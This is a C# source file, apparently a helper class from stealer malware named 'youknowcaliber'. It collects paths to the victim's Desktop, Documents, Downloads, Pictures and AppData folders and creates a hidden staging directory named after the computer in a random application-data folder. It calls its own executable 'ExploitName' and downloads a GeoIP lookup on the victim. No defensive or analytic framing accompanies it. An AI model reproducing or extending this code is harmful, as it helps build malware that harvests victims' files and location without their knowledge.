﻿using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Xml;

namespace youknowcaliber
{
	internal class Help
	{
		public static string Generate()
		{
			string text = "acegikmoqsuwyBDFHJLNPRTVXZ";
			string text2 = "";
			Random random = new Random();
			int num = random.Next(0, text.Length);
			for (int i = 0; i < num; i++)
			{
				text2 += text[random.Next(10, text.Length)].ToString();
			}
			return text2;
		}

		public static void Ethernet()
		{
			try
			{
				Help.xml.LoadXml(new WebClient().DownloadString(Help.GeoIP));
			}
			catch (Exception arg)
			{
				Console.WriteLine(arg + "Ethernet()");
				Help.check = false;
			}
		}

		public static readonly string Pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

		public static readonly string Downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");

		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

		public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

		public static readonly string ExploitDirectory = Path.GetDirectoryName(Help.ExploitName);

		public static string[] SysPatch = new string[]
		{
			Help.AppData,
			Help.LocalData,
			Help.CommonData
		};

		public static string zxczxczxc = Help.SysPatch[new Random().Next(0, Help.SysPatch.Length)];

		public static string ExploitDir = Help.zxczxczxc + "\\" + SystemInfo.compname;

		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");



		public static XmlDocument xml = new XmlDocument();

		public static bool check = true;
	}
}
